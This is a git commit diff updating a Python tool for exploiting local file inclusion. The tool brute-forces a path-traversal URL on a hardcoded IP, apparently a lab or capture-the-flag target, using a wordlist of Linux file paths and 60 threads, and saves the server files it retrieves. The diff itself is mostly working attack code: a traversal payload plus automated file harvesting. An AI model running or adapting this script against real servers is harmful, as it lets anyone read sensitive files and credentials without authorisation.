e96e83a87fd9e8f96e355146f92ce4396c5d2021
Mane <mane@manesec.com>
2023-11-16 23:38:52 +0800

    Update LFIThreadingRequest.py

--- Script/LFI/LFIThreadingRequest.py
+++ Script/LFI/LFIThreadingRequest.py
@@ -1,18 +1,24 @@
 #!/usr/bin/env python3
 
 # This script use to help for lfi exploit.
+# Only support strings
+
 from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED
 import requests
 import sys,os
 
 wordlist_location = "./lfi-linux-full.txt"
 save_dir = "output/"
-thread_num = 10
+thread_num = 60
 url = "http://10.129.96.46/file_management/?file=../../../../../../../.."
 
 def savefile(data,aline):
-    print("\nReceived: " + aline)
-    savefile = save_dir + str(os.path.abspath(aline)).replace("/","_").replace("\\","_")
+    global save_dir
+    if (data.strip() == "") : 
+        print("\nSKIP: " + aline + "\n")
+        return
+    print("\nReceived: " + aline + "\n")
+    savefile = save_dir + str(os.path.abspath(aline)).replace("/","_").replace("\\","_").replace("~","_")
     file = open(savefile,"w",encoding='utf-8')
     file.writelines(data)
     file.close()
@@ -20,14 +26,17 @@ def savefile(data,aline):
 executor = ThreadPoolExecutor(max_workers=thread_num)
      
 def sub_thread(wordlist):
+    global url, save_dir
     try:
+        print(".",end="")
+
         # How to send request ? 
-        print(".",end='')
-        return_str = requests.get(url + wordlist).text
+        send_url = url + wordlist
+        return_str = requests.get(send_url).text
 
         # When to save file?
         if return_str.find("Internal Server Error") == -1 :
-            savefile(return_str,line)
+            savefile(return_str,wordlist)
         # Done
     except:
         pass
@@ -37,7 +46,6 @@ def sub_thread(wordlist):
 tasks = []
 with open(wordlist_location,'r', encoding='utf-8') as wordlists:
     for line in wordlists:
-        tasks.append(executor.submit(sub_thread, (line)))
+        tasks.append(executor.submit(sub_thread, (line.strip())))
 
 wait(tasks, return_when=ALL_COMPLETED)
-
